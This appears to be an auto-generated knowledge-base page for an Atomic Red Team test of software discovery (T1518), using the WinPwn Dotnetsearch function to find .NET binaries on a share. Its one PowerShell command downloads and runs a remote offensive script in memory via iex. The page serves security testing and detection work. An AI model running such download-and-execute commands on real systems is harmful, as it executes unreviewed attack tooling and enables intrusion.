---
atomic_guid: "7e79a1b6-519e-433c-ad55-3ff293667101"
title: "WinPwn - Dotnetsearch"
framework: "atomic"
generated: "true"
attack_technique_id: "T1518"
attack_technique_name: "Software Discovery"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1518/T1518.yaml"
build_date: "2026-04-26 14:38:40"
executor: "powershell"
aliases:
  - "7e79a1b6-519e-433c-ad55-3ff293667101"
  - "WinPwn - Dotnetsearch"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# WinPwn - Dotnetsearch

Search for any .NET binary file in a share using the Dotnetsearch function of WinPwn

## Metadata

- Atomic GUID: 7e79a1b6-519e-433c-ad55-3ff293667101
- Technique: T1518: Software Discovery
- Platforms: windows
- Executor: powershell
- Source Path: atomics/T1518/T1518.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1518-software_discovery|T1518]]

## Executor

- name: powershell

### Command

```powershell
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
Dotnetsearch -noninteractive -consoleoutput
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1518/T1518.yaml)
